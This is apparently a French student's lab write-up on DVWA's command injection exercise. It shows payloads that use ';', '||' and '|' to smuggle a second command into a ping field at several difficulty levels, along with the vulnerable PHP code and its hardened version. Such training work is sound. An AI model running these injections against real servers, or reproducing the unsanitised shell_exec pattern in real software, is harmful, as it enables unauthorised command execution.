# 1. Command Injection

La Command Injection est une vulnérabilité de sécurité où un attaquant peut injecter et exécuter des commandes système dans une application, souvent via une interface utilisateur. Cette vulnérabilité permet à un attaquant d'exécuter des commandes directement sur le serveur ou la machine hôte qui exécute l'application.

Lorsqu'une application prend des données en entrée de l'utilisateur (par exemple via un formulaire web) et les utilise sans validation ou filtre, un attaquant peut insérer une commande système malveillante dans l'entrée. Si l'application passe cette entrée directement à un interpréteur de commande (comme le shell Linux), l'attaquant peut exécuter des commandes non autorisées sur le serveur.

## 1.1 Premier niveau - low

On arrive sur une page avec un service de ping  
![images](file://C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\exec\1.png?msec=1736349725469)

Puisque c'est du PHP, on va essayer une simple méthode qui consiste à utiliser le caractère `;` pour "sortir" du code PHP qui permet de ping, puis saisir la commande que l'on souhaite :

```bash
; cat ../exec/source/low.php
```

Ici, par exemple, nous affichons le code source de la page, ce qui nous permettra de visualiser en même temps comment fonctionne le serveur.

![images](file://C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\exec\2.png?msec=1736349725471)

Puisque c'est du code PHP, il faut regarder avec `Ctrl + U` pour voir le script :

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    $html .= "<pre>{$cmd}</pre>";
}
```

On remarque qu'il n'y a aucun contrôle sur l'input de l'utilisateur. De plus, on comprend mieux comment les commandes système sont exécutées : grâce à la fonction `shell_exec()` de PHP.

---

## 1.2 Deuxième niveau - medium

Pour ce deuxième niveau, en essayant avec `;`, l'injection ne fonctionne pas. Nous avons donc cherché différents caractères propres à Linux qui auraient pu échapper au filtre que le développeur a mis en place, car on se doute que certains caractères ont été blacklistés.

Après une recherche rapide sur Internet, on tombe sur un GitHub :  
`https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md`  
Ce dernier nous fournit quelques indications :

```
; (Semicolon): Allows you to execute multiple commands sequentially.
&& (AND): Execute the second command only if the first command succeeds (returns a zero exit status).
|| (OR): Execute the second command only if the first command fails (returns a non-zero exit status).
& (Background): Execute the command in the background, allowing the user to continue using the shell.
| (Pipe): Takes the output of the first command and uses it as the input for the second command.
```

En essayant ces caractères, on en trouve un qui n'est pas blacklisté : `||`.  
Cela nous permet d'exécuter cette commande et de lire le code PHP :

```bash
|| cat ../exec/source/medium.php
```

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the characters in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    $html .= "<pre>{$cmd}</pre>";
}
```

Notre théorie initiale était correcte. On remarque effectivement une blacklist qui inclut `;` et `&&`, mais pas `||`.

---

## 1.3 Troisième niveau - hard

Pour ce troisième challenge, on part du principe que l'administrateur a blacklisté tous les caractères mentionnés précédemment. Nous devons donc trouver une autre méthode.

En essayant plusieurs commandes, on trouve cette commande qui fonctionne :

```bash
|cat ../exec/source/high.php
```

Le script est bien exécuté :  
![images](file://C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\exec\3.png?msec=1736349725470)

On peut maintenant essayer de comprendre pourquoi.  
La raison est probablement un oubli ou une faute de frappe, puisqu'on voit que le symbole `|` n'est pas blacklisté, mais le symbole `| ` (avec un espace) l'est. Cela nous permet donc d'exécuter notre code.

---

## 1.4 Niveau impossible

Voici le code PHP du niveau impossible :

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
        // Check Anti-CSRF token
        checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

        // Get input
        $target = $_REQUEST[ 'ip' ];
        $target = stripslashes( $target );

        // Split the IP into 4 octets
        $octet = explode( ".", $target );

        // Check IF each octet is an integer
        if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
                // If all 4 octets are int's put the IP back together.
                $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

                // Determine OS and execute the ping command.
                if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
                        // Windows
                        $cmd = shell_exec( 'ping  ' . $target );
                }
                else {
                        // *nix
                        $cmd = shell_exec( 'ping  -c 4 ' . $target );
                }

                // Feedback for the end user
                $html .= "<pre>{$cmd}</pre>";
        }
        else {
                // Ops. Let the user name theres a mistake
                $html .= '<pre>ERROR: You have entered an invalid IP.</pre>';
        }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

### Analyse

L'input de l'utilisateur est récupéré via `$_REQUEST['ip']`, puis la fonction `stripslashes()` est appliquée pour retirer les caractères spéciaux.

Ensuite, l'adresse IP est vérifiée à l'aide du bloc suivant :

```php
$octet = explode( ".", $target );
if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) )
```

Ce code divise l'IP en 4 parties grâce au séparateur `.`. Chaque octet est validé avec `is_numeric()` pour vérifier qu'il s'agit bien de chiffres. Enfin, la taille est contrôlée avec `sizeof($octet) == 4